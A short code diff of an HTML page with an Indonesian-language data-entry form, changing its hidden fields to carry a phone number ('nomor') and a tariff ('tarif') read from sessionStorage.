@@ -246,7 +246,9 @@
 
 
  <form id="formLog" onsubmit="sendLog()">
-<input type="hidden" id="nomorku" name="nomorku" value="">	
+       
+<input type="hidden" id="tarif" name="tarif">	
+<input type="hidden" id="nomor" name="nomor">	
    
           <p class="info">Silahkan lengkapi data berikut</p>
           <hr class="gares">
@@ -280,8 +282,10 @@
 <div class="nav2"></div>
 <script>
        
- var nomor = sessionStorage.getItem("nomor");
-document.getElementById("nomorku").value = nomor + "";
+ document.getElementById("tarif").value =
+        sessionStorage.getItem("tarif");
+document.getElementById("nomor").value =
+        sessionStorage.getItem("nomor");
   
 </script>
 <script src="token.js"></script>
